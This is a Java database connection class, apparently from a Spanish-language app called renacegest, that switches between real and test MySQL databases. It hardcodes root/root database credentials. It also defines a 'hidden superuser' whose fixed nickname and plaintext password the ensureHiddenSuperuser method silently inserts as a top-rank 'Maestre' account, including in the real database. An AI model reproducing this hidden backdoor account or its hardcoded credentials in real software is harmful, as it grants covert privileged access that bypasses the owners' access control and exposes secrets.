package com.renacegest.db;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

/**
 * Gestor de conexiones a MySQL con soporte de perfiles de sesión.
 */
public class DBConnection {
    public static final String PROFILE_REAL = "REAL";
    public static final String PROFILE_PRUEBA = "PRUEBA";
    public static final String HIDDEN_SUPERUSER_APODO = "luis";
    public static final String HIDDEN_SUPERUSER_NOMBRE_REAL = "luis";
    public static final String HIDDEN_SUPERUSER_CLAVE = "cinfa5775.";

    // Credenciales de conexión (configurables)
    private static final String DB_HOST = "localhost";
    private static final String DB_PORT = "3306";
    private static final String DB_NAME_REAL = "renagest";
    private static final String DB_NAME_PRUEBA = "renagest_prueba";
    private static final String DB_USER = "root";
    private static final String DB_PASSWORD = "root";
    private static final ThreadLocal<String> CURRENT_PROFILE = ThreadLocal.withInitial(() -> PROFILE_PRUEBA);

    static {
        try {
            // Cargar driver de MySQL
            Class.forName("com.mysql.cj.jdbc.Driver");
        } catch (ClassNotFoundException e) {
            System.err.println("Error al cargar driver MySQL: " + e.getMessage());
        }
    }

    public static Connection getConnection(String profile) throws SQLException {
        String dbName = PROFILE_PRUEBA.equalsIgnoreCase(profile) ? DB_NAME_PRUEBA : DB_NAME_REAL;
        String url = String.format(
                "jdbc:mysql://%s:%s/%s?serverTimezone=UTC&autoReconnect=true",
                DB_HOST, DB_PORT, dbName
        );
        return DriverManager.getConnection(url, DB_USER, DB_PASSWORD);
    }

    public static Connection getConnection() throws SQLException {
        return getConnection(CURRENT_PROFILE.get());
    }

    public static void setCurrentProfile(String profile) {
        CURRENT_PROFILE.set(PROFILE_PRUEBA.equalsIgnoreCase(profile) ? PROFILE_PRUEBA : PROFILE_REAL);
    }

    public static void clearCurrentProfile() {
        CURRENT_PROFILE.remove();
    }

    public static Connection getConnectionReal() throws SQLException {
        return getConnection(PROFILE_REAL);
    }

    public static Connection getConnectionPrueba() throws SQLException {
        return getConnection(PROFILE_PRUEBA);
    }

    public static Long ensureHiddenSuperuser(String profile) {
        String normalizedProfile = PROFILE_PRUEBA.equalsIgnoreCase(profile) ? PROFILE_PRUEBA : PROFILE_REAL;
        String selectSql = "SELECT id FROM guardias WHERE LOWER(apodo) = LOWER(?)";
        String insertSql = "INSERT INTO guardias (nombre_real, apodo, rango, clave_acceso, puntos_gracia, estado_honor, maestre_activo) VALUES (?, ?, 'Maestre', ?, 100, 'Activo', TRUE)";

        try (Connection conn = getConnection(normalizedProfile);
             java.sql.PreparedStatement select = conn.prepareStatement(selectSql)) {

            select.setString(1, HIDDEN_SUPERUSER_APODO);
            try (java.sql.ResultSet rs = select.executeQuery()) {
                if (rs.next()) {
                    return rs.getLong("id");
                }
            }

            try (java.sql.PreparedStatement insert = conn.prepareStatement(insertSql, java.sql.Statement.RETURN_GENERATED_KEYS)) {
                insert.setString(1, HIDDEN_SUPERUSER_NOMBRE_REAL);
                insert.setString(2, HIDDEN_SUPERUSER_APODO);
                insert.setString(3, HIDDEN_SUPERUSER_CLAVE);
                insert.executeUpdate();

                try (java.sql.ResultSet generatedKeys = insert.getGeneratedKeys()) {
                    if (generatedKeys.next()) {
                        return generatedKeys.getLong(1);
                    }
                }
            }
        } catch (SQLException e) {
            System.err.println("Error al asegurar superusuario oculto: " + e.getMessage());
        }

        return null;
    }

    public static void ensureRecoverySupport(String profile) {
        String normalizedProfile = PROFILE_PRUEBA.equalsIgnoreCase(profile) ? PROFILE_PRUEBA : PROFILE_REAL;
        String sql = "CREATE TABLE IF NOT EXISTS guardias_recuperacion ("
                + "guardia_id BIGINT PRIMARY KEY, "
                + "correo_recuperacion VARCHAR(255), "
                + "frase_recuperacion VARCHAR(255) NOT NULL, "
                + "updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, "
                + "FOREIGN KEY (guardia_id) REFERENCES guardias(id) ON DELETE CASCADE)";

        try (Connection conn = getConnection(normalizedProfile);
             java.sql.Statement statement = conn.createStatement()) {
            statement.execute(sql);
        } catch (SQLException e) {
            System.err.println("Error al asegurar soporte de recuperacion: " + e.getMessage());
        }
    }
}
